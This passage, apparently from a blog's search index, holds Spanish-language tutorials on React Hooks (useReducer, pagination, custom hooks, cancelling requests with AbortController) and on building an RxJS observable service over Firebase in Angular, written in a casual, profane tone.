arreglo o un objeto para que se gatille un useEffect() o un renderizado. Bueno en el siguiente ejemplo emplearemos el mismo ejemplo despachamos para la casa a useState() y le daremos la bienvenida a useReducer() te parece conocido el nombre verdad si has usado Redux o la función reducer sabrás de lo que habloHack 2 - Petición asíncrona con useReducer y useEffectTomando como base el hack anterior vamos a reemplazar el Hook useState() por useReducer() y usando sus valores como estado para mostrar los datos del gráfico del ejemplo anterior agregaremos unos cuantos valores más para poder ver el patrón reducer el cual lo podemos encontrar en aplicaciones con manejo de estado mediante Redux.Como diablos funciona el patron reducerEL patrón reducer básicamente es definir una función reductora la cual recibe el estado actual de los datos y el nuevo estado que queremos definir entonces nuestra función reductora puede definir cálculos o lógicas a partir de estos 2 valores y retornar un nuevo estado. Si vamos a la programación funcional el típico ejemplo es sumar el valor anterior y el nuevo valor para generar una sumatoria entonces el resultado sería un acumulado de los datos. Ahora veamos como se implementa en React.En React el Hook useReducer() recibe una función reductora la cual recibe 2 parámetros el estado actual del componente y un acción el cual tiene las siguientes propiedades type y payload donde type es un nombre de acción único nos dice que debe hacer el reducer y por último payload sería el nuevo estado o valores que usara nuestra función reductora. Lo sé esto suena enredado, pero vamos al maldito ejemplo.Definiremos el modelo de nuestro reducer.// estado del componenteinterface State { title: string; data: PieChartData | null; quantity: number; loading: boolean;}// modelo de la accioninterface Action { type: Type; payload?: any;}// tipos de aciones que puede realizar nuestra funcion reductoraenum Type { SET_DATA, LOADING,}Muy bien ahora esta es la implementación de la función reductora:const reducer = (state: State, action: Action) =&gt; { switch (action.type) { case Type.LOADING: return { ...state, loading: true } case Type.SET_DATA: const payload = action.payload return { ...state, data: payload, loading: false, quantity: 100 } }}Como ves la función recibe el estado y una acción entonces mediante un case realizaremos operaciones sobre el estado anterior y el payload suministrado como puedes apreciar no siempre necesitaremos definir un payload.Ahora llamaremos el hook useReducer() de la siguiente maneraconst [state, dispatch] = useReducer(reducer, { data: null, quantity: 0, title: 'my fucking chart', loading: false,})useReducer() recibe la función reductora y un estado inicial y nos devuelve un arreglo con el estado del componente y una función llamada dispatch() esto es muy parecido a useState() con la diferencia que la función dispatch() recibe un objeto Action el cual definimos anteriormente.Ahora para realizar cambios al estado nada usamos la funcion dispatch().dispatch({ type: Type.LOADING }) getPieChartData() .then(pieChart =&gt; dispatch({ type: Type.SET_DATA, payload: pieChart }))Vemos el primer llamado a la acción LOADING el cual cambia el estado y asigna a la variable loading el valor true y finalmente al recibir data desde nuestra petición asíncrona usamos la acción SET_DATA y el detalle es que no necesitamos una accion como STOP_LOADING para volver a asignar la variable a false, ya que lo hacemos en el propio reducer.Terminando nuestro Hack component queda así.import React, { useEffect, useReducer } from 'react';import getPieChartData from '../../../core/application/getPieChartData';import { PieChartData } from '../../../core/domain/model/PieChartData';import PieChart from '../../components/PieChart';interface State { title: string; data: PieChartData | null; quantity: number; loading: boolean;}interface Action { type: Type; payload?: any;}enum Type { SET_DATA, LOADING,}const reducer = (state: State, action: Action) =&gt; { switch (action.type) { case Type.LOADING: return { ...state, loading: true } case Type.SET_DATA: const payload = action.payload return { ...state, data: payload, loading: false, quantity: 100 } }}export default function PieChartUseReducerUseEffect() { const [state, dispatch] = useReducer(reducer, { data: null, quantity: 0, title: 'my fucking chart', loading: false, }) const { loading, data, quantity } = state useEffect(() =&gt; { dispatch({ type: Type.LOADING }) getPieChartData() .then(pieChart =&gt; dispatch({ type: Type.SET_DATA, payload: pieChart })) }, []) if (loading) { return &lt;div&gt;Loading motherfucking data...&lt;/div&gt; } return ( &lt;&gt; &lt;h1&gt;Total de datos {quantity}&lt;/h1&gt; &lt;PieChart data={data} /&gt; &lt;/&gt; )}Terminamos con nuestro ejemplos de uso de useState() vs useReducer() ahora podemos tener una noción de cuando usar useReducer() en vez del clásico useState() esto dependerá de la complejidad del componente y el modelo de datos del estado. También debemos tener la sabiduría para dividir el problema en vez de crear componentes enormes llenos de Hooks y lógicas complejas en modelos de datos enormes.Hack 3 - Tabla con paginado desde una APIAhora vamos a crear un ejemplo con la simulación de un llamado a una API con paginado usando la misma lógica anterior, pero con la maldita diferencia que usaremos el array de dependencias el Hook useEffect() para detectar la petición del usuario de cambiar de página. La misma idea puede ser aplicada para un filtro dinámico donde se necesite ejecutar la actualización de la data mediante la interacción del usuario. Crearemos nuestro nuevo caso de uso getUsersPaginated() con el siguiente códigointerface Params { page: number; size: number;}interface Response { users: User[]; total: number;}export default function getUsersPaginated({ page, size }: Params): Promise&lt;Response&gt;{ return awaitTimeout(1000) .then(() =&gt; USERS) .then(users =&gt; users.slice((page - 1) * size, page * size)) .then(users =&gt; ({ users, total: USERS.length }));}La lista de usuarios la transformamos a una constante y nos ayudamos del encadenamiento de promesas para un código más simple a la vista y nos ayudamos del método slice() para el paginado.Ahora implementamos nuestro componente con paginado queda de la siguiente maneraDefinimos nuestros nuevos estados para el paginado. Las propiedades importantes acá son page (página actual de la tabla) y total (tamaño de todos los datos) las cuales serán las que irán mutando mediante las peticiones del usuario, size también puede mutar si se implementa el selector de tamaño por páginas en este caso será omitidoconst [page, setPage] = useState(2)const [size, setSize] = useState(3)const [total, setTotal] = useState(0)A continuación definimos nuestro useEffect(). El cual invoca nuestro caso de uso getUsersPaginated() y recibe los parámetros de page y size definiendo la porción de datos a buscar desde nuestra API simulada.Al recibir una respuesta modificamos el estado de los datos de la tabla y el estado total el cual nos indica el total de registros existente en la API, finalmente definimos las dependencias del Hook que indican que si esas dependencias cambian el Hook useEffect() debe ejecutarse estas variables [page, size] serán actualizadas mediante las peticiones del usuariouseEffect(() =&gt; { setLoading(true) getUsersPaginated({ page, size }) .then(res =&gt; { setDatatable(res.users) setTotal(res.total) }) .finally(() =&gt; setLoading(false))}, [page, size])El uso importante de useEffect es definir correctamente las dependencias que harán que se gatille el efecto estas dependencias podrían ser valores de un filtro con lo cual lograríamos crear una funcionalidad de consulta de datosAhora definimos la función que ejecutar el usuario al cambiar el paginado de los datos. Es una simple función callback que actualizara el estado de la variable page y esta función callback lo recibirá el componente de paginado que creemosconst onPageChange = (value: number) =&gt; { setPage(value)}No entraremos en detalle de la implementación de la tabla y el paginado, ya que estamos estudiando los Hooks y esta implementación estará presente el repositorio&lt;Container maxWidth=\"md\"&gt; &lt;h1&gt;Data from async api&lt;/h1&gt; &lt;UserTable datatable={datatable} page={page} size={size} total={total} onPageChange={onPageChange} /&gt;&lt;/Container&gt;Nuestro componente final seria el siguiente:import React, { useEffect, useState } from 'react';import { Container } from '@mui/material';import getUsersPaginated from '../core/application/getUsersPaginated';import { User } from '../core/domain/model/User';import UserTable from '../components/UserTable';export default function DatatableFromAPIPaginated() { const [datatable, setDatatable] = useState([] as User[]) const [loading, setLoading] = useState(false) const [page, setPage] = useState(2) const [size, setSize] = useState(3) const [total, setTotal] = useState(0) useEffect(() =&gt; { setLoading(true) getUsersPaginated({ page, size }) .then(res =&gt; { setDatatable(res.users) setTotal(res.total) }) .finally(() =&gt; setLoading(false)) }, [page, size]) const onPageChange = (value: number) =&gt; { setPage(value) } if (loading) { return &lt;div&gt;Loading data...&lt;/div&gt; } return ( &lt;Container maxWidth=\"md\"&gt; &lt;h1&gt;Data from async api&lt;/h1&gt; &lt;UserTable datatable={datatable} page={page} size={size} total={total} onPageChange={onPageChange} /&gt; &lt;/Container&gt; )}Nuestro componente esta de putas maravillas funciona correctamente en su funcionalidad básica, pero en un componente real debemos tener un control de errores el cual puede ser incluso una variable de estado al igual que loading implementando la misma estrategia, pero dejame decirte que existen opciones más desacopladas como usar interceptores en las peticiones y controlar desde ahí los errores, pero eso es mejor explicarlo en otra instancia con mas detalle.Nuestro siguiente paso será refactorizar el componente con un Hook personalizado.Este componente es pequeño y nuestro deber es seguir manteniéndolo así para que nuestra aplicacion sea mantenible y resiliente al cambio esto nos suena a S.O.L.I.D. verdad, en el frontend se olvidan a menudo de este concepto principalmente el de RESPONSABILIDAD ÚNICA así que vamos a aplicar un reactor.Bienvenido Custom HookHack 4 - Tabla con paginado con custom hookEn nuestro componente anterior utilizamos un montón de useState() y useEfffect() para crear una API mínima de usuarios, ahora moveremos toda la lógica de estos Hooks a uno personalizado.Para crear un Hook personalizado solo basto con mover toda la lógica de los Hooks usados en una simple función, esta función puede recibir parámetros y devolver valores de estado o funciones que puedan realizar código definido dentro del Hook creado entonces el código lo movemos a la siguiente funciónimport { useEffect, useState } from \"react\"import getUsersPaginated from \"../../core/application/getUsersPaginated\"import { User } from \"../../core/domain/model/User\"interface Hook { users: User[]; loading: boolean; page: number; size: number; total: number; requestGetUsers: (page: number, size: number) =&gt; void;}export default function useGetUsers(): Hook { const [users, setUsers] = useState([] as User[]) const [loading, setLoading] = useState(false) const [page, setPage] = useState(2) const [size, setSize] = useState(3) const [total, setTotal] = useState(0) useEffect(() =&gt; { setLoading(true) getUsersPaginated({ page, size }) .then(res =&gt; { setUsers(res.users) setTotal(res.total) }) .finally(() =&gt; setLoading(false)) }, [page, size]) const requestGetUsers = (page: number, size: number) =&gt; { setPage(page) setSize(size) } return { users, loading, page, size, total, requestGetUsers }}y finalmente nuestro componente queda de esta formaimport React from 'react';import { Container } from '@mui/material';import UserTable from '../../components/UserTable';import useGetUsers from '../../hooks/useGetUsers';export default function DatatablePaginatedCustomHook() { const { users, page, total, size, loading, requestGetUsers } = useGetUsers() const onPageChange = (value: number) =&gt; { requestGetUsers(value, size) } if (loading) { return &lt;div&gt;Loading data...&lt;/div&gt; } return ( &lt;Container maxWidth=\"md\"&gt; &lt;h1&gt;Data from async api&lt;/h1&gt; &lt;UserTable datatable={users} page={page} size={size} total={total} onPageChange={onPageChange} /&gt; &lt;/Container&gt; )}Una gran diferencia con nuestro componente anterior. Este es mucho más limpio, con lógica encapsulada, separamos las responsabilidades y podemos escalar de mejor maneraHack 5 Custom Hook para cancelar peticiones httpMuchass veces hemos perdido la paciencia con páginas lentas y nos ponemos en modo loco y a darle al click como 20 mil veces como si eso solucionar el asunto y la página la muy cabrona se vuelve más lenta. Cuantas veces nos ha pasado y me imagino como desarrolladores cuantas veces hemos creado páginas con el mismo problema en donde en cierto comportamiento ocurre estoBueno en este post vamos a abordar una solución a uno de los problemas que causa esto.Como manejar peticiones http cancelablesCuando lanzamos una petición http al servidor desde un cliente generalmente el “happy path” es realizar la petición recibir los datos mostrarlos y si existe un error tratarlo pero muchas veces existen escenarios donde una petición http puede ser lanzada múltiples veces sin que el desarrollador haya predicho que el usuario haciendo ciertas acciones lograría mandar un montón de peticiones entonces el backend puede quedar en espera tramitando la petición dando la sensación de que estamos en un Internet Explorer generalmente para evitar eso se bloquean botones o se pone el típico loading, pero ojo que hay interacciones complejas en el frontend donde no todos los bloqueos o validaciones cubrirán los casosUn caso típico es el de las pestañas o un menú de navegación en una aplicación, imaginate crear un menú y que cuando el usuario hace click en un módulo del menú empieza a cargarse el módulo, pero después el usuario hace click en otro módulo y empieza otra petición y así puede hacerlo si la página es lenta lo más probable que se ponga en modo loco y haga click por todos lados en estos caso lo ideal es que las peticiones se puedan cancelar entonces cada vez que cambie de módulo o haga click la petición que estaba en curso sea cancelada de lo contrario veríamos una respuesta más lenta en servidores que no aguanten mucha carga por el lado de React también puede ocurrir un warning de que no podemos actualizar el estado en un componente desmontado lo cual ocurre porque una petición se procesó y el resultado se quiere escribir en un componente inexistente porque ahora se está tratando de cargar otro, React nos advierte que puede ser un posible “memory leak” y es mejor evitarlo así que vamos a crear el maldito ejemplo que es mucha cháchara para un par de líneas de códigoEl caso de ejemploCrearemos un módulo que muestra las aves chilenas en esta ocasión están no nombre en inglés, la funcionalidad más ridícula que se me ocurrió, pero sirve para mostrar el problemaInstalaremos axios para manejar las peticiones httpnpm install axiosAhora creamos la estructura de la respuesta de la API y la función fecthAllChileanBirds() que hace un llamado a la api Aves ninjaimport axios, { AxiosResponse } from 'axios';export interface ChileanBirdResponse { uid: string; name: { spanish: string; english: string; latin: string; }; images: { main: string; full: string; thumb: string; }, _links: { self: string; parent: string; }, sort: number;}export function fecthAllChileanBirds(): Promise&lt;AxiosResponse&lt;ChileanBirdResponse[]&gt;&gt; { return axios.get('https://aves.ninjas.cl/api/birds')}Ahora crearemos nuestro caso de uso que hará un llamado a la API y nos devolverá las aves chilenas con su nombre en ingles y su nombre en latín para que nuestro post parezca más intelectual me vea la nasa y me saque de LatinoaméricaModeloexport interface Bird { id: string; name: string; latinname: string;}Función Adapterimport { ChileanBirdResponse } from \"../../api/ChileanBirdsApi\";import { Bird } from \"../model/Bird\";export function ChileanBirdToEnglishBirdAdapter(response: ChileanBirdResponse): Bird { return { id: response.uid, name: response.name.english, latinname: response.name.latin, }}Caso de usoimport { fecthAllChileanBirds } from \"../api/ChileanBirdsApi\";import { ChileanBirdToEnglishBirdAdapter } from \"../domain/adapter/ChileanBirdToEnglishBirdAdapter\";import { Bird } from \"../domain/model/Bird\";export default function getEnglishNameBirds(): Promise&lt;Bird[]&gt; { return fecthAllChileanBirds() .then(res =&gt; res.data) .then(birds =&gt; birds.map(b =&gt; ChileanBirdToEnglishBirdAdapter(b)))}Ojo nótese la función ChileanBirdToEnglishBirdAdapter() la cual es usada como patrón Adapter donde recibirá un objeto externo al “Dominio” o lógica “core” de la aplicación y nos devolverá un objeto de tipo Modelo o entidad la cual será usado por nuestros casos de usos, ¿que ventajas hay usando esto? Bueno principalmente desacopla él la lógica de negocio frente a implementaciones u objetos externos los cuales podrían ser una respuesta de una API o cualquier implementación de una librería de terceros imagina que después cambiemos la API de aves chilenas por otra cuya respuesta sea distinta entonces centralizamos el cambio en un solo punto que sería la función adaptadora.Hook personalizado para funciones asíncronasAhora crearemos un Hook personalizado para hacer uso de funciones asíncronas con lo cual usaremos para obtener las aves chilenas con su nombre en ingles y pintarlos sobre un componente de Reactimport { useEffect, useState } from \"react\"type Callback&lt;T&gt; = () =&gt; Promise&lt;T&gt;interface Hook&lt;T&gt; { loading: boolean; data: T | undefined; error: any;}export default function useAsync&lt;T&gt;(callback: Callback&lt;T&gt;): Hook&lt;T&gt;{ const [data, setData] = useState&lt;T&gt;() const [loading, setLoading] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { setLoading(true) callback() .then(response =&gt; setData(response)) .catch(err =&gt; setError(err)) .finally(() =&gt; setLoading(false)) }, []) return { loading, data, error }}Este Hook no tien mayor gracia usa el useState() y useEffect() de toda la vida tiene un loading un estado de posibles errores. Ahora crearemos otro componente que reflejará el caso de usoimport getEnglishNameBirds from \"../../../../../core/application/getEnglishNameBirds\";import { Bird } from \"../../../../../core/domain/model/Bird\";import useAsync from \"./useAsync\";export default function useEnglishBirds() { return useAsync&lt;Bird[]&gt;(getEnglishNameBirds)}Este hook importa la función getEnglishNameBirds() como caso de uso y la agrega como parámetro al Hook useAsync() y es todoEl componente de Aves en inglésimport React from 'react';import useEnglishBirds from '../hooks/useEnglishBirds';import BirdContainer from '../../../shared/components/BirdContainer';export default function EnglishTranslateBirds() { const { loading, data } = useEnglishBirds() return ( &lt;BirdContainer datatable={data} loading={loading} /&gt; )}Ahora crearemos el componete que hará uso del hook useEnglishBirds() para mostrar las aves chilenas en ingles la implementación del componente es lo de menos, ya que es una clase de HooksNuestro frontend luce asíFOTO_FRONTAhora si hacemos múltiples clicks sobre el menú de aves y sobre el cualquier otroFOTO_MENU Y CILCKAhora vamos a inspeccionar página y nos vamos a networking y si hacemos múltiples clicks sobre el menú de aves y sobre el cualquier otro obtendremos las siguientes peticionesFOTO_NETWORKINGComo ves quedaron pendientes muchas peticiones y todas terminaran, pero es total ineficiente y más cuando hay apis que son síncronas que lanzan un hilo nuevo por cada petición necesitamos cancelar las petición. Para lograr esto necesitamos crear un objeto AbortController propio de la API nativa del navegador esta solución que te presentaré funciona tanto en axios como con la Fetch opción nativa del navegador para hacer peticiones.Cambiaremos la implementación de la petición de las aves chilenas agregando a la petición de axios un parámetro llamado signal el cual es de tipo AbortSignal con el cual axios se dará cuenta de qué la petición debe ser canceladaexport function fecthCancellableChileanBirds(signal?: AbortSignal): Promise&lt;AxiosResponse&lt;ChileanBirdResponse[]&gt;&gt; { return axios.get('https://aves.ninjas.cl/api/birds', { signal })}Nuestro caso de uso ahora no solo devolverá una petición para obtener las aves sino que también devolverá una función para cancelar la petición, esta vez obtendremos las aves chilenas en idioma españolDefinimos la estructura de la respuesta del caso de usointerface GetSpanishBirdServices { fetchBirds: () =&gt; Promise&lt;Bird[]&gt;; cancelFetchBirds: () =&gt; void;}Y ahora definimos la lógica de la petición y de cancelaciónexport default function getSpanishBirdsServices(): GetSpanishBirdServices { const controller = new AbortController() const request = () =&gt; fecthCancellableChileanBirds(controller.signal) .then(res =&gt; res.data) .then(birds =&gt; birds.map(b =&gt; ChileanBirdToSpanishBirdAdapter(b))) return { fetchBirds: request, cancelFetchBirds: () =&gt; controller.abort() }}Ya ahora nuestro caso de uso devuelve un objeto que simula un típico componente “Service”Entendiendo el ciclo de vida en ReactEs momento de entender el ciclo de vida de los Hooks en React para poder implementar nuestra cancelación de petición cuando usamos el Hook useEffect() este recibe una función callback que se ejecutara cuando se actualiza alguna dependencia definida en un array definido como segundo parámetro del Hook en la mayoría de los casos necesitamos solo definir una función que haga una acción y termine ahí, pero la función callback que definimos en useEffect puede devolver un función y ¿para qué rayos sirve esta función? Esta función es llamada “cleanup” y se ejecuta cada vez que el componente se desmonta es ideal para ejecutar acciones como es el cerrado de una conexión por websocket por ejemplo o un clearInterval si se usa la función useInterval() en Hooks entonces esta función es ideal para nuestro propósito de cancelar un petición httpEntonces nuestro Hook quedara de la siguiente maneraimport { useEffect, useState } from \"react\"interface Hook&lt;T&gt; { loading: boolean; data: T | undefined; error: any;}export interface CancellableRequest&lt;T&gt; { execute: () =&gt; Promise&lt;T&gt;; cancel: () =&gt; void;}export default function useCancelableAsync&lt;T&gt;(cancellablerequest: CancellableRequest&lt;T&gt;): Hook&lt;T&gt;{ const { execute, cancel } = cancellablerequest; const [data, setData] = useState&lt;T&gt;() const [loading, setLoading] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { setLoading(true) execute() .then(response =&gt; setData(response)) .catch(err =&gt; setError(err)) .finally(() =&gt; setLoading(false)) return () =&gt;{ cancel() } }, []) return { loading, data, error }}Los únicos cambios son las propiedades de nuestro Hook serán la petición asíncrona que debe realizar una función que cancel la operación así quienes implementen el uso de hook se preocuparan de realizar las operaciones de limpieza del hook finalmente en el useEffec() la función callback definida devolverá una función que se encargara de realizar la cancelación de la peticiónuseAsyncCancellable en acciónAhora definimos el componente que usara nuestro custom Hookimport React from 'react';import BirdContainer from '../../../shared/components/BirdContainer';import getSpanishBirdsServices from '../../../../../core/application/getSpanishNameBirdsCancellable';import useCancelableAsync from '../hooks/useCancelableAsync';import { Bird } from '../../../../../core/domain/model/Bird';export default function SpanishTranslateBirdsCancellable() { const { fetchBirds, cancelFetchBirds } = getSpanishBirdsServices() const { data, loading } = useCancelableAsync&lt;Bird[]&gt;({ execute: fetchBirds, cancel: cancelFetchBirds }) return ( &lt;BirdContainer datatable={data} loading={loading} /&gt; )}Y así de simple usamos nuestro Hook definimos nombres de funciones y variables claras que expresan totalmente la intención de la aplicación. Finalmente vemos los resultados de múltiples clicks en distintos módulos y como en la sección networking apreciamos los benditos canceled. Un respiro para el backend y una optimización excelente para nuestro frontendFOTOS RESULTADOSConclusiónLas conclusiones debes sacarlas por ti mismo leer implementar y seguir aprendiendo de otros recursos. por mientras un meme" }, { "title": "Ejemplo programación reactiva 100% Real No Fake", "url": "/posts/Ejemplo-programaci%C3%B3n-reactiva-100-Real-No-Fake/", "categories": "Programacion, Angular, Rxjs", "tags": "rxjs, typescript, javascript, frontend, firebase, observables", "date": "2022-09-20 20:32:00 -0300", "snippet": "Ejemplo programación reactiva 100% Real No FakeLa programación reactiva es un paradigma enfocado en el trabajo con flujos de datos finitos o infinitos de manera asíncrona. Su concepción y evolución ha ido ligada a la publicación del Reactive Manifesto, que establecía las bases de los sistemas reactivos, los cuales deben ser: Responsivos: aseguran la calidad del servicio cumpliendo unos tiempos de respuesta establecidos. Resilientes: se mantienen responsivos incluso cuando se enfrentan a situaciones de error. Elásticos: se mantienen responsivos incluso ante aumentos en la carga de trabajo. Orientados a mensajes: minimizan el acoplamiento entre componentes al establecer interacciones basadas en el intercambio de mensajes de manera asíncrona.La motivación detrás de este nuevo paradigma procede de la necesidad de responder a las limitaciones de escalado presentes en los modelos de desarrollo actuales, que se caracterizan por su desaprovechamiento del uso de la CPU debido al I/O, el sobreuso de memoria (enormes thread pools) y la ineficiencia de las interacciones bloqueantes.La arquitectura de estos sistemas se basa en los patrones observable, iterable y la integración del paradigma funcional. Todo esto crea una forma distinta de tratar los datos, ya que dejamos de verlos como variables y pasan a ser flujos de datos. Con el tiempo hemos pasado de tratar con una cantidad de datos ya definidos a fuentes de datos infinitas tales como mensajería en tiempo real, eventos de usuario, comunicación entre servicios en diversos protocolos, logs, Iot, etc.¿El paradigma de programación imperativo solucionaba esto?¿Imagina tratar con flujo de datos que no sabes cuando termina o intermitente en el tiempo con nuestros clásicos while data.exists() do some_operation() esto es lo más básico para tratar con datos, pero imaginate controlar si hay un error tendremos que agregar un try catch ahora si necesitamos reintentar el proceso? ¿Vamos a volver a recorrer nuestros datos? Ahora se quiere un nuevo proceso que haga cálculos con esa data, o duplicamos la lógica o la agrandamos, y si ahora los datos crecen y el algoritmo se necesita optimizar? Todo a la basura y a reimplementar, suena a complejidad y difícil de mantener.Acordémonos del manifiesto reactivo y verás que el paradigma imperativo se vuelve complejo de usar en este contexto de sistemas.El uso de programación reactiva no implica dejar nuestra amada clásica forma de programar es más como te había explicado la programación funcional juega un papel importante, lo que debemos tener claro es que la programación imperativa es ideal para crear funciones específicas con lógicas más pequeñas y con una responsabilidad única, no usemos esto para controlar procesos complejos cuando existen arquitecturas de software pensadas en resolver estos problemas. Con la separación de responsabilidades dentro de una solución de software con esto podemos lograr código más testeable y seguir arquitecturas como S.O.L.I.D.Se terminó la cháchara vamos a crear nuestra primera aplicación reactivaEn esta ocasión compartiré un pequeño ejemplo de uso de programación reactiva utilizando la librería RxJs donde crearemos un servicio que utiliza Firebase con las operaciones de lectura escritura y escucha de actualizaciones de datos. Usaremos Angular ya que es un framework full reactivo ideal para este ejemplo.¿Qué es un observable?Un observable es un objeto con el que podemos manipular un stream de datos estos pueden emir valores de forma infinita o finita de forma asíncrona y a su vez un observable nos proporciona una manera de poder estar a la escucha del flujo de datos poseen los siguientes métodos:next() # es la llamada a emitir un valor dadosubscribe() # es un método que recibe la emisión de valorescomplete() # nos índica que el observable termino de emitir valores y ya no volverá a hacerloerror() # nos indica que un error ha ocurrido al emitir un valorEl uso basico de un observable es el siguiente:import { Observable } from 'rxjs';const obs$ = new Observable&lt;string&gt;(subs =&gt; { subs.next(\"Hello\"); subs.next(\"World!!!\");});obs$.subscribe(console.log);nuestra salida en consola sera“Hello”“World”Si invocamos a complete()const obs$ = new Observable&lt;string&gt;(subs =&gt; { subs.next(\"Hello\"); subs.next(\"World!!!\"); subs.complete(); subs.next(\"And Good Bye!!!\")});obs$.subscribe(console.log);La salida sería la misma que la anterior, ya que hemos completado el observable no emitirá más valores aunque llamemos a next()Creando un cliente firebaseAhora crearemos un cliente Firebase utilizando la misma lógica. Definiremos una interfaz con las operaciones que nuestros casos de uso necesitan.Hemos definido la interfaz DocumentProvider con operaciones de manipulación de documentos, Firebase no es la única solución serverless a sí que si en un futuro queremos enviar a la casa a Firebase podremos hacerlo sin complicaciones.import { Observable } from \"rxjs\";export interface DocumentProvider { saveDocument(collectionName: string, entity: any): Observable&lt;any&gt;; onDocumentAdded(collectionName: string, entityAdapter: (data: any) =&gt; any): Observable&lt;any&gt;;}Implementamos nuestra interfaz y definimos sus métodos, agregamos la inicialización de Firebase en este caso usamos la mala práctica de inicializar un. Objeto dentro del constructor, porque se me da la gana y en este caso veo más óptimo guardar la lógica de Firebase en este componente, ya que la inyección de dependencias es más importante en los servicios core de la aplicación como los caso de uso. Implementaremos el método onDocumentAdded() ya que acá usaremos la clase Observable Rxjs.import { initializeApp } from \"firebase/app\"import { Firestore, getFirestore } from \"firebase/firestore\"import { Observable } from 'rxjs';import { environment } from '../../../environments/environment';import { DocumentProvider } from './providers/document.provider';initializeApp({ apiKey: environment.firebase.apiKey, authDomain: environment.firebase.authDomain, projectId: environment.firebase.projectId});export class FirebaseClientService implements DocumentProvider { private db: Firestore = null; constructor() { this.db = getFirestore(); } saveDocument(collectionName: string, entity: any) { } onDocumentAdded(collectionName: string, entityAdapter: (data: DocumentData) =&gt; any) { }}Lo primero es definir el queryDocument para poder estar a la escucha de nuevos documentos agregados en Firebase.Llamamos al objeto query y a su vez a collection de las librerías de Firebase le pasamos como parámetro el nombre de una colección y el objeto ya inicializado de FireStore, con esto obtenemos el queryDocument con el cual hacer operaciones sobre Firebase. onDocumentAdded(collectionName: string, entityAdapter: (data: DocumentData) =&gt; any) { const queryDocument = query(collection(this.db, collectionName)); }Ahora definimos las siguientes funciones callback para crear nuestro objeto observable.Estas funciones son necesarias por Firebase para poder crear una escucha en tiempo real de las actualizaciones de los documentos mediante una función onSnapshot() propia de Firebase onDocumentAdded(collectionName: string, entityAdapter: (data: DocumentData) =&gt; any) { const queryDocument = query(collection(this.db, collectionName)); const onSnapshotNext = (snapshot: QuerySnapshot&lt;DocumentData&gt;, observer: Observer&lt;any&gt;) =&gt; { } const onSnapshotError = (error: FirestoreError, observer: Observer&lt;any&gt;) =&gt; { } const onSnapshotComplete = (observer: Observer&lt;any&gt;) =&gt; { } }onSnapshotNext(): Esta función llama a observer.next() cuando recibe un documento de Firebase y con esto nuestro observable emitirá el valor obtenido.Cuando nos ponemos en escucha a los cambios de un documento en Firebase con snapshot.docChanges() recibimos un objeto de tipo QuerySnapshot el cual nos permite realizar operaciones para obtener una respuesta más limpia adecuada a nuestras necesidades.así que haremos lo siguiente: filtraremos por él el change.type de “added” haremos un map() a la propiedad “data” usaremos la función callback entityAdapter() para convertir los datos recibidos de Firebase a un objeto de tipo Entidad de nuestra aplicación. Con esto centralizamos la inicialización de una entidad en un único punto Por cada documento agregado llamamos a observer.next(entityValue)const onSnapshotNext = (snapshot: QuerySnapshot&lt;DocumentData&gt;, observer: Observer&lt;any&gt;) =&gt; { snapshot.docChanges() .filter(change =&gt; change.type === 'added') .map(change =&gt; change.doc.data()) .map(data =&gt; entityAdapter(data)) .forEach(entity =&gt; observer.next(entity)) }La implementación de observer.error() y observer.complete() son las siguientes: const onSnapshotError = (error: FirestoreError, observer: Observer&lt;any&gt;) =&gt; { observer.error(error) } const onSnapshotComplete = (observer: Observer&lt;any&gt;) =&gt; { observer.complete() }Ahora definimos nuestro objeto Observable y dentro de su función callback llamamos a onSnapshot() quien es el encargado de poder tener nuestros documentos de Firebase en tiempo real, a esta función le debemos pasar como parámetros las funciones que definimos onSnapshoNext() onSnapshotError() y onSnapshotComplete() y con esto ya tendríamos la posibilidad de suscribirnos a nuevos documentos agregados. const documentAdded$ = new Observable((observer: Observer&lt;any&gt;) =&gt; { // función Firebase para poder estar a la escucha de eventos en tiempo real onSnapshot( queryDocument, // collecion de documentos a escuchar por nuevos cambios (snapshot) =&gt; onSnapshotNext(snapshot, observer), // funcion callback para emitir valores err =&gt; onSnapshotError(err, observer), // error () =&gt; onSnapshotComplete(observer) // termino de emision de eventos );})Finalmente devolvemos nuestro observable, pero fíjense en que el observable lo devolvemos con un llamado a una función llamada pipe()y ¿para qué sirve pipe? Pipe nos sirve para poder encadenar operadores o funciones que se ejecutaran sobre los flujos de datos de nuestro observable y en esta ocasión lo usamos para agregar el operador share() es cuál nos permite que el observable que retorna es único para todos los que se suscriban a él, si share() no estuviera cada vez que un cliente se suscriba a Firebase se crearía una nueva conexión a Firebase lo cual no es óptimo en este caso, a posibilidad de pipe es que nos puede devolver nuevos observables a partir de otros. Que maravilla lógicas complejas pueden ser reutilizables.return documentAdded$.pipe( share())Otra forma de crear observablesAhora implementaremos el método saveDocument() este deberá guardar un documento en Firebase y devolver un Observable para crear observables Rxjs nos facilita operadores creacionales para facilitar este proceso, no siempre crear un Observable a la vieja escuela es lo ideal, pero a veces debemos hacerlo en esta ocasión usaremos el operador from() con el cual podemos crear un observable a partir de una promesa y así de simple cuando necesitamos observables a partir de primitivos u objetos. Existen más operadores creacionales, pero no se abordan acá.saveDocument(collectionName: string, entity: any) { const promise = setDoc(doc(this.db, collectionName, entity.id), entity) return from(promise).pipe( map(() =&gt; entity) )}Finalmente nuestro servicio queda de la siguiente manera:import { initializeApp } from \"firebase/app\"import { doc, setDoc, DocumentData, Firestore, FirestoreError, getDoc, getFirestore, QuerySnapshot, collection, query, onSnapshot } from \"firebase/firestore\"import { from, map, Observable, Observer, share } from 'rxjs';import { environment } from '../../../environments/environment';import { DocumentProvider } from './providers/document.provider';initializeApp({ apiKey: environment.firebase.apiKey, authDomain: environment.firebase.authDomain, projectId: environment.firebase.projectId});export class FirebaseService implements DocumentProvider { private db: Firestore = null; constructor() { this.db = getFirestore(); } saveDocument(collectionName: string, entity: any) { const promise = setDoc(doc(this.db, collectionName, entity.id), entity) return from(promise).pipe( map(() =&gt; entity) ) } onDocumentAdded(collectionName: string, entityAdapter: (data: DocumentData) =&gt; any) { const queryDocument = query(collection(this.db, collectionName)); const onSnapshotNext = (snapshot: QuerySnapshot&lt;DocumentData&gt;, observer: Observer&lt;any&gt;) =&gt; { snapshot.docChanges() .filter(change =&gt; change.type === 'added') .map(change =&gt; change.doc.data()) .map(data =&gt; entityAdapter(data)) .forEach(entity =&gt; observer.next(entity)) } const onSnapshotError = (error: FirestoreError, observer: Observer&lt;any&gt;) =&gt; { observer.error(error) } const onSnapshotComplete = (observer: Observer&lt;any&gt;) =&gt; { observer.complete() } const documentAdded$ = new 